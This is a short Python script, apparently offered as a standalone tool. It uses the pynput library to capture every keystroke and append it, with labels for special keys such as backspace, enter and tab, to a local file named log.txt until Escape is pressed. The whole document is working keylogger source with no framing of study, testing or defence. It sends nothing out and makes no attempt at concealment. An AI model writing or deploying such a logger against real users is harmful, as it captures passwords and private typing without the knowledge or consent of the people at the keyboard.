import time
from pynput.keyboard import Listener, Key
import logging

# Setup logging to log the keystrokes to a file
logging.basicConfig(filename="log.txt", level=logging.INFO, format="%(message)s")

# Function to handle each keystroke
def on_press(key):
    try:
        if key == Key.backspace:
            logging.info("[backspace]")
        elif key == Key.enter:
            logging.info("[enter]")
        elif key == Key.shift:
            logging.info("[shift]")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            logging.info("[control]")
        elif key == Key.caps_lock:
            logging.info("[caps lock]")
        elif key == Key.tab:
            logging.info("[tab]")
        elif key == Key.alt_l or key == Key.alt_r:
            logging.info("[alt]")
        else:
            logging.info(str(key.char))
    except AttributeError:
        # Handle special keys like space, etc.
        if key == Key.space:
            logging.info(" ")
        elif key == Key.esc:
            return False  # Stop listener when Escape is pressed

# Start the key logger
def start_logging():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logging()
